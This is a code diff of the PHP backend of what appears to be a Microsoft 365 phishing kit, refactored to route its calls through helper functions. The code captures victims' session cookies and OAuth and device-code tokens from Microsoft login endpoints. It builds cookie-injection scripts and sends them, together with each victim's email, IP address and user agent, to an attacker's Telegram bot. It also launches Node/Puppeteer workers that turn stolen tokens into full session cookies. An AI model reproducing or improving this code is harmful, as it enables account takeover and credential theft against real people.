-            $cookieIdSanitized = $cookieIdRaw !== '' ? preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieIdRaw) : '';
+            $cookieIdSanitized = $cookieIdRaw !== '' ? Security::sanitizeId($cookieIdRaw) : '';
 
             // Fix: Ignore empty submissions (requires at least email)
             if ($email === '' && $password === '') {
@@ -1987,14 +1905,7 @@ class Api {
         try {
             Security::log("API: handleCaptureExistingSession called");
             $projectRoot = realpath(__DIR__ . '/..');
-            $cmd = "cd " . escapeshellarg($projectRoot) .
-                   " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v chromium`; fi" .
-                   " && HOME=" . escapeshellarg($projectRoot) .
-                   " NODE_PATH=" . escapeshellarg($projectRoot . '/node_modules') .
-                   " XDG_CONFIG_HOME=" . escapeshellarg($projectRoot . '/chrome_config') .
-                   " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache') .
-                   " PUPPETEER_CACHE_DIR=" . escapeshellarg($projectRoot . '/.cache/puppeteer') .
-                   " node " . escapeshellarg($projectRoot . '/capture_session.js') . " > /dev/null 2>&1 &";
+            $cmd = Worker::buildNodeCommand($projectRoot, 'capture_session.js', '', '', '', true);
             
             Security::log("API: Executing command: $cmd");
             shell_exec($cmd);
@@ -2057,8 +1968,7 @@ class Api {
 
     private static function handleGetConfig() {
         $cfg = Config::load();
-        // Security::log("DEBUG: handleGetConfig sending: " . json_encode($cfg));
-        
+
         // Filter sensitive data before sending to client
         $safeCfg = $cfg;
         $sensitiveKeys = ['masterLicenseKey', 'encKey', 'proxycheckApiKey', 'telegramBotToken', 'cfApiKey', 'cfSecretKey'];
@@ -2072,8 +1982,8 @@ class Api {
         $safeCfg['msDeviceFlowClientId'] = $cfg['msDeviceFlowClientId'] ?? null;
         $safeCfg['msSsoClientId'] = $cfg['msSsoClientId'] ?? null;
         $safeCfg['postAuthRedirectUrl'] = $cfg['postAuthRedirectUrl'] ?? null;
-                    $safeCfg['msDeviceFlowUrl'] = $cfg['msDeviceFlowUrl'] ?? null;
-                    echo json_encode(['ok' => true] + $safeCfg);
+        $safeCfg['msDeviceFlowUrl'] = $cfg['msDeviceFlowUrl'] ?? null;
+        echo json_encode(['ok' => true] + $safeCfg);
     }
 
     private static function handleClearLogs() {
@@ -2100,7 +2010,7 @@ class Api {
     }
 
     private static function handleGetCookies() {
-        $id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $_GET['id']) : '';
+        $id = isset($_GET['id']) ? Security::sanitizeId($_GET['id']) : '';
         $type = isset($_GET['type']) ? $_GET['type'] : '';
 
         if (!$id) {
@@ -2199,7 +2109,6 @@ class Api {
         $deviceCode = $data['device_code'] ?? '';
         $email = $data['email'] ?? 'device_flow';
         $clientId = $data['clientId'];
-        $skipVps = !empty($data['skip_vps']); // NEW: Read skip_vps flag
 
         if (!$deviceCode) {
             http_response_code(400);
@@ -2331,21 +2240,8 @@ class Api {
                 file_put_contents($sessionInjectScript, $scriptContent);
 
                 // Telegram Success (No Worker Needed)
-                $cfg = Config::load();
-                if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
-                    $msg = Worker::generateTelegramMessage($email, "DEVICE_FLOW_SUCCESS", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "✅ 13 Session Cookies Captured (PHP-Only Mode)");
-                    $urlTg = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
-                    Worker::sendRequest($urlTg, ['chat_id' => $cfg['telegramChatId'], 'text' => $msg], $cfg);
-
-                    // NEW: Send the script file to Telegram
-                    $urlDoc = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendDocument";
-                    $payloadDoc = [
-                        'chat_id' => $cfg['telegramChatId'],
-                        'document' => new \CURLFile($sessionInjectScript, 'application/javascript', "php_cookies_{$email}.js"),
-                        'caption' => "/////// PHP-ONLY COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
-                    ];
-                    Worker::sendRequest($urlDoc, $payloadDoc, $cfg, true);
-                }
+                Worker::sendTelegramMessage($email, "DEVICE_FLOW_SUCCESS", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "✅ 13 Session Cookies Captured (PHP-Only Mode)");
+                Worker::sendTelegramDocument($email, $sessionInjectScript, "php_cookies_{$email}.js");
                 
                 // Final result update
                 file_put_contents($resultFile, json_encode(['cookieId' => $cookieId, 'status' => 'completed', 'mode' => 'php']));
@@ -2524,13 +2420,6 @@ class Api {
                 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                 $response = curl_exec($ch);
                 self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');
-                
-                // DEEP DEBUG for the test user
-                if (stripos($email, 'jaco') !== false) {
-                    $debugFile = __DIR__ . '/../session_data/debug_graph_' . time() . '.html';
-                    file_put_contents($debugFile, "URL: $graphUrl\n\nRESPONSE:\n$response");
-                    Security::log("PHP_CAPTURE: [DEEP DEBUG] Saved Graph response to: " . basename($debugFile));
-                }
 
                 // SAS ProcessAuth (Most aggressive endpoint for ESTSAUTH)
                 Security::log("PHP_CAPTURE: Accessing SAS ProcessAuth...");
@@ -2789,7 +2678,6 @@ class Api {
     }
 
     private static function extractCookiesFromResponse($response, &$cookies, $defaultDomain) {
-        preg_match_all('/^Set-Cookie:\s*([^;\r\n]*)/mi', $response, $matches);
         preg_match_all('/^Set-Cookie:\s*(.*)$/mi', $response, $fullMatches);
         
         foreach($fullMatches[1] as $fullItem) {
@@ -2844,7 +2732,7 @@ class Api {
     }
 
     private static function handleGetTokens() {
-        $id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $_GET['id']) : '';
+        $id = isset($_GET['id']) ? Security::sanitizeId($_GET['id']) : '';
         if (!$id) {
             echo json_encode(['ok' => false, 'error' => 'Missing ID']);
             exit;
@@ -2925,28 +2813,8 @@ class Api {
         file_put_contents($sessionInjectScript, $scriptContent);
 
         // Telegram Notification
-        $cfg = Config::load();
-        if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
-            $ip = Security::getClientIp();
-            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-            $msg = Worker::generateTelegramMessage($email, "MANUAL_EXTRACT", $ip, $ua, "🍪 (Manual Extraction Successful)");
-            
-            $url = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
-            $payload = [
-                'chat_id' => $cfg['telegramChatId'],
-                'text' => $msg
-            ];
-            Worker::sendRequest($url, $payload, $cfg);
-            
-            // Send document
-            $urlDoc = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendDocument";
-            $payloadDoc = [
-                'chat_id' => $cfg['telegramChatId'],
-                'document' => new \CURLFile($sessionInjectScript, 'application/javascript', "cookies_{$email}.js"),
-                'caption' => "/////// MANUAL COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
-            ];
-            Worker::sendRequest($urlDoc, $payloadDoc, $cfg, true);
-        }
+        Worker::sendTelegramMessage($email, "MANUAL_EXTRACT", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "🍪 (Manual Extraction Successful)");
+        Worker::sendTelegramDocument($email, $sessionInjectScript, "cookies_{$email}.js");
 
         echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
     }
@@ -3000,27 +2868,14 @@ class Api {
             'time' => date('c')
         ]);
 
-        // Trigger Hybrid Worker (token_swap.js) to generate full 13 cookies
         $projectRoot = realpath(__DIR__ . '/..');
-        $cmd = "cd " . escapeshellarg($projectRoot) .
-               " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v chromium`; fi" .
-               " && HOME=" . escapeshellarg($projectRoot) .
-               " NODE_PATH=" . escapeshellarg($projectRoot . '/node_modules') .
-               " XDG_CONFIG_HOME=" . escapeshellarg($projectRoot . '/chrome_config') .
-               " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache') .
-               " PUPPETEER_CACHE_DIR=" . escapeshellarg($projectRoot . '/.cache/puppeteer') .
-               " node " . escapeshellarg($projectRoot . '/token_swap.js') . " " . escapeshellarg($email) . " \"OAUTH_TOKEN_CAPTURED\" " . escapeshellarg($cookieId) . " > /dev/null 2>&1 &";
+        $cmd = Worker::buildNodeCommand($projectRoot, 'token_swap.js', $email, 'OAUTH_TOKEN_CAPTURED', $cookieId, true);
 
         Security::log("HYBRID: Triggering Hybrid Worker for $email ($cookieId)");
         shell_exec($cmd);
 
         // Notify via Telegram
-        $cfg = Config::load();
-        if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
-            $msg = Worker::generateTelegramMessage($email, "HYBRID_FLOW_START", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "🔄 Hybrid Token Capture Successful! Generating cookies...");
-            $urlTg = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
-            Worker::sendRequest($urlTg, ['chat_id' => $cfg['telegramChatId'], 'text' => $msg], $cfg);
-        }
+        Worker::sendTelegramMessage($email, "HYBRID_FLOW_START", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "🔄 Hybrid Token Capture Successful! Generating cookies...");
 
         echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
     }
